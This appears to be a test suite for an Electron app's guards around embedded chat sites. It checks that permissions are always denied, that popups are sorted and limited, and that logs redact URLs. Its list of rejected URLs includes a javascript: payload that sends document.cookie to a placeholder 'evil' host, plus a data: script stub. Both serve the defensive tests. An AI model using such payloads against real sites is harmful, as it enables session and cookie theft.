/**
 * 内嵌站点的权限与弹窗闸门（纯函数 + 接线，不需要 Electron）
 *
 * 这一项没有「跑一遍看看」的轻量验证通道：装 handler 要在 Electron 里才生效，
 * 而「该不该放」的判断错一次就是静默的 —— 站点拿到麦克风不会有任何提示。
 * 所以能钉死的两层都钉：
 * - 纯函数层：URL 协议判定、三档弹窗归属、日志不得漏出整条 URL；
 * - 接线层：三道 handler 确实装在 web-contents-created 上、确实恒拒、
 *   确实登记了唯一的例外（登录窗口），且注册早于第一枚窗口。
 *
 * 运行：npm run test:webview-guards
 */

import assert from 'node:assert/strict'
import fs from 'node:fs'
import path from 'node:path'
import {
  LOGIN_POPUP_BUDGET,
  claimInAppPopup,
  denyNote,
  isHttpUrl,
  isLoginWindow,
  loginPopupTitle,
  markLoginWindow,
  popupDisposition,
  popupNote,
  releaseLoginWindow,
  safeHost,
} from '../src/main/webview/guards'

const ROOT = path.resolve(__dirname, '..')

let pass = 0
let fail = 0

async function it(name: string, fn: () => Promise<void> | void): Promise<void> {
  try {
    await fn()
    pass++
    console.log(`  [PASS] ${name}`)
  } catch (e) {
    fail++
    console.log(`  [FAIL] ${name}`)
    console.log(`         ${(e as Error).message.split('\n').slice(0, 4).join('\n         ')}`)
  }
}

function readSrc(rel: string): string {
  return fs.readFileSync(path.join(ROOT, rel), 'utf8')
}

async function main(): Promise<void> {
  console.log('='.repeat(46))
  console.log('  内嵌站点闸门：权限一律拒、弹窗不失控')
  console.log('='.repeat(46))

  await it('协议判定：只认 http(s)，解析不了的按不可信处理', () => {
    assert.equal(isHttpUrl('http://chatgpt.com/a'), true)
    assert.equal(isHttpUrl('https://deepseek.com'), true)
    assert.equal(isHttpUrl('HTTPS://BigModel.cn/x'), true, '协议大小写不该成为绕路')
    for (const bad of [
      'javascript:alert(1)',
      'data:text/html,<script>steal()</script>',
      'blob:https://x/8f0e',
      'file:///C:/Users/you/Desktop/x.html',
      'about:blank',
      '//evil.com/phish',
      '',
      '不是 URL',
    ]) {
      assert.equal(isHttpUrl(bad), false, `${bad} 不该被当成可打开的链接`)
    }
  })

  await it('弹窗分档：登录窗口放行到应用内，其余站点一律不占应用窗口', () => {
    const url = 'https://accounts.google.com/o/oauth2/auth'
    assert.equal(popupDisposition(url, { loginWindow: true }), 'in-app', 'OAuth 靠弹窗续接，一刀切就登不进去')
    assert.equal(popupDisposition(url, { loginWindow: false }), 'external', '聊天页里的链接不该长出第二枚 Torra 窗口')
  })

  await it('弹窗分档：非 http(s) 连系统浏览器都不给，且与是否登录窗口无关', () => {
    const poison = 'javascript:fetch("http://evil/"+document.cookie)'
    assert.equal(popupDisposition(poison, { loginWindow: false }), 'block')
    assert.equal(popupDisposition(poison, { loginWindow: true }), 'block', '登录窗口也不是免检牌')
    assert.equal(popupDisposition('', { loginWindow: true }), 'block')
  })

  await it('登录窗口例外是登记制的：没登记、已释放都不算', () => {
    assert.equal(isLoginWindow(4242), false, '没人登记的 id 不能默认放行')
    markLoginWindow(4242)
    assert.equal(isLoginWindow(4242), true)
    releaseLoginWindow(4242)
    assert.equal(isLoginWindow(4242), false, '窗口关了就该撤，例外不累积')
  })

  await it('额度：一枚登录窗口最多放行 LOGIN_POPUP_BUDGET 枚，之后不再是例外', () => {
    const id = 5100
    markLoginWindow(id)
    for (let i = 1; i <= LOGIN_POPUP_BUDGET; i++) {
      assert.equal(claimInAppPopup(id), i, `第 ${i} 枚该放行`)
    }
    assert.equal(claimInAppPopup(id), null, '第 3 枚必须没额度 —— 无限放行就是「站点能刷一串 Torra 窗口」')
    assert.equal(isLoginWindow(id), true, '额度用尽不等于取消登记：它仍是登录窗口，只是不再长窗口')
    releaseLoginWindow(id)
  })

  await it('额度：取用是按窗口计数的，未登记与释放后都取不到', () => {
    assert.equal(claimInAppPopup(5101), null, '没登记的 id 没有额度可用')
    markLoginWindow(5101)
    assert.equal(claimInAppPopup(5101), 1)
    releaseLoginWindow(5101)
    assert.equal(claimInAppPopup(5101), null)
    markLoginWindow(5101)
    assert.equal(claimInAppPopup(5101), 1, '重新登记就是一枚新窗口，计数归零，不继承上一枚的用量')
    markLoginWindow(5102)
    assert.equal(claimInAppPopup(5102), 1, '一枚窗口用尽额度不该影响另一枚')
    releaseLoginWindow(5101)
    releaseLoginWindow(5102)
  })

  await it('额度与协议判定是两条独立的闸：非 http(s) 恒 block，额度不参与', () => {
    markLoginWindow(5103)
    const claim = claimInAppPopup(5103)
    assert.equal(claim, 1)
    assert.equal(popupDisposition('javascript:alert(1)', { loginWindow: claim !== null }), 'block')
    releaseLoginWindow(5103)
  })

  await it('窗口身份：弹窗标题由 Torra 说清楚，不靠站点自己的 <title>', () => {
    const t = loginPopupTitle(1)
    assert.match(t, /Torra 登录弹窗/, '用户要一眼认出这是 Torra 开的临时窗口')
    assert.match(t, /第 1 枚/, '第几枚要和额度对得上，用户才知道后续为什么走系统浏览器')
    assert.match(t, /临时窗口/, '要写明是登录用的、用完可关')
    assert.doesNotMatch(t, /[a-z]+\.[a-z]+\//i, '标题里不带目标站点路径 —— 那是仿冒页最爱伪装的部分')
    assert.notEqual(loginPopupTitle(2), loginPopupTitle(1), '序号要能区分，否则串窗了也看不出来')
  })

  await it('留痕：走外部时能说明「为什么不是应用内」，且不把整条 URL 抄进日志', () => {
    const note = popupNote('external', 'https://auth.example.com/o?code=SECRET', 'https://x.taobao.com/login', '登录弹窗额度已用尽')
    assert.match(note, /交系统浏览器/)
    assert.match(note, /登录弹窗额度已用尽/, '体检读这句才知道是被额度挡的，不是闸门出错')
    assert.doesNotMatch(note, /SECRET|\?code=/, '理由照旧只落固定措辞与主机名')
    const inApp = popupNote('in-app', 'https://login.doubao.com/oauth', 'https://doubao.com', undefined)
    assert.match(inApp, /放行到应用内：login\.doubao\.com/)
    assert.doesNotMatch(inApp, /（）|（undefined/, '没理由时不留空括号')
  })

  await it('日志只落主机名：整条 URL 不进诊断（那里面常带一次性 token）', () => {
    const src = 'https://chatgpt.com/c/1234?access_token=SECRET#frag'
    assert.equal(safeHost(src), 'chatgpt.com')
    assert.doesNotMatch(safeHost('不完整的'), /./, '解析不了就空串，别把原文抄进日志')
    const note = denyNote('media', src)
    assert.match(note, /^media 已拒绝/, '要看得见是哪个权限被拒')
    assert.match(note, /chatgpt\.com/)
    assert.doesNotMatch(note, /SECRET|access_token|1234/, '拒绝原因不能顺手把凭据写进日志')
  })

  await it('拒绝口径要说人话：写明是闸门拒的，不是站点坏了', () => {
    const note = denyNote('notifications', 'https://www.doubao.com/chat')
    assert.match(note, /不给内嵌站点任何权限/, '用户/体检读到这句就知道是被设计挡住的')
    assert.match(note, /doubao\.com/)
    assert.match(denyNote('geolocation', ''), /来源 未知页面/, '拿不到来源时也要有个明确说法')
  })

  await it('弹窗留痕：三档各有明确措辞，挡住的东西看得见', () => {
    assert.match(popupNote('in-app', 'https://auth.x.com/o', 'https://yuanbao.taobao.com/login'), /放行到应用内/)
    assert.match(popupNote('external', 'https://ref.example/a', 'https://chatgpt.com/c/1'), /交系统浏览器/)
    assert.match(popupNote('block', 'javascript:alert(1)', 'https://chatgpt.com/c/1'), /整体挡掉/)
    assert.match(popupNote('external', 'https://ref.example/a', ''), /应用页面/, '来源未知也要说清是谁发起的')
  })

  await it('接线：三道闸门装在 web-contents-created 上，每个 webContents 都过一遍', () => {
    const main = readSrc('src/main/index.ts')
    const body = main.match(/function hardenEmbeddedContents\(\): void \{([\s\S]*?)\n\}/)
    assert.ok(body, '找不到 hardenEmbeddedContents 的实现')
    const impl = body[1] ?? ''
    assert.match(impl, /setPermissionCheckHandler\(\(\) => false\)/, '同步的权限自检也要拒，否则站点能先问后动')
    assert.match(impl, /setPermissionRequestHandler/, '不装就是「自动批准一切权限请求」')
    assert.match(impl, /ses\.setPermissionCheckHandler/, '权限 handler 挂在 session 上，挂 webContents 是静默失效')
    assert.match(impl, /hardened\.has\(ses\)/, '同一分区重复注册会顶掉前一个闭包，来源就串了')
    assert.match(impl, /callback\(false\)/)
    assert.doesNotMatch(impl, /callback\(true\)/, '没有第二档：不给任何按权限名放行的口子')
    assert.match(impl, /setWindowOpenHandler/, '默认行为是在应用内开子窗，且复用同一 persist: 分区')
    assert.match(impl, /return \{ action: 'deny' \}/)
    assert.match(impl, /shell\.openExternal\(url\)/)
    assert.match(main, /app\.on\('web-contents-created'/)
    assert.match(main, /from '.\/webview\/guards'/)
  })

  await it('接线：闸门登记必须早于 whenReady，否则第一枚窗口带不上', () => {
    const main = readSrc('src/main/index.ts')
    const callAt = main.search(/^hardenEmbeddedContents\(\)$/m)
    const readyAt = main.indexOf('app.whenReady()')
    assert.ok(callAt > 0, '模块顶层要有一次调用，光有定义不生效')
    assert.ok(readyAt > callAt, `登记(${callAt})必须早于建窗(${readyAt})`)
  })

  await it('接线：只有登录窗口被登记为例外，关闭即撤销', () => {
    const pool = readSrc('src/main/webview/pool.ts')
    assert.match(pool, /const loginContentsId = login\.webContents\.id/, 'id 要在窗口还在时取')
    assert.match(pool, /markLoginWindow\(loginContentsId\)/)
    assert.match(pool, /login\.once\('closed', \(\) => releaseLoginWindow\(loginContentsId\)\)/, '不能留着一串失效 id')
    assert.match(pool, /import \{ markLoginWindow, releaseLoginWindow \} from '.\/guards'/)
    assert.doesNotMatch(pool, /markLoginWindow\(login\.webContents\.id\)/, '放进 closed 回调就读不到 id 了')
  })

  await it('接线：应用内放行要过额度这一道，窗口标题由 Torra 钉死', () => {
    const main = readSrc('src/main/index.ts')
    const body = main.match(/function hardenEmbeddedContents\(\): void \{([\s\S]*?)\n\}/)
    assert.ok(body, '找不到 hardenEmbeddedContents 的实现')
    const impl = body[1] ?? ''
    assert.match(impl, /isLoginWindow\(contents\.id\)\s*\?\s*claimInAppPopup\(contents\.id\)/, '登记与额度分两步：日志才分得清「不是登录窗口」和「额度用尽」')
    assert.match(impl, /loginWindow: claim !== null/, '额度用尽后就不能再自称登录例外')
    assert.match(impl, /if \(d === 'in-app' && claim !== null\)/, 'allow 必须挂在 claim 上，光靠档位判断会开出无名窗口')
    assert.match(impl, /did-create-window/, '子窗一造出来就登记身份，晚一步站点标题就抢到了')
    assert.match(impl, /child\.setTitle\(title\)/)
    assert.match(impl, /page-title-updated[\s\S]{0,80}preventDefault/, '挡住 <title>，否则 Torra 的窗口会被改名叫「元宝」')
    assert.match(impl, /overrideBrowserWindowOptions: \{ autoHideMenuBar: true, title \}/, '创建时就给 title：setTitle 之前那一瞬也是空档')
    assert.match(impl, /登录弹窗额度已用尽/, '走外部要写明原因，否则体检里看不出是额度挡的')
    assert.doesNotMatch(impl, /LOGIN_POPUP_BUDGET/, '数字只在 guards.ts 说了算，接线层不自己数')
    const guards = readSrc('src/main/webview/guards.ts')
    assert.match(guards, /export const LOGIN_POPUP_BUDGET = \d+/, '额度必须是可命名的常量，不是散在 if 里的魔法数')
    assert.match(guards, /slot\.used >= LOGIN_POPUP_BUDGET/)
  })

  await it('用例本身挂在 npm test 链上，不是一跑而过就没人看的孤儿', () => {
    const pkg = JSON.parse(readSrc('package.json')) as { scripts: Record<string, string> }
    assert.equal(pkg.scripts['test:webview-guards'].includes('scripts/test-webview-guards.ts'), true)
    assert.match(pkg.scripts.test, /run-tests/, 'npm test 必须走 scripts/run-tests.js 汇总跑法')
    assert.ok(!pkg.scripts.test.includes('&&'), '回到 && 串链：首处失败会遮蔽后面的套件')
  })

  console.log('-'.repeat(46))
  console.log(`  通过 ${pass} · 失败 ${fail}`)
  console.log('='.repeat(46))
  if (fail > 0) process.exit(1)
}

void main()
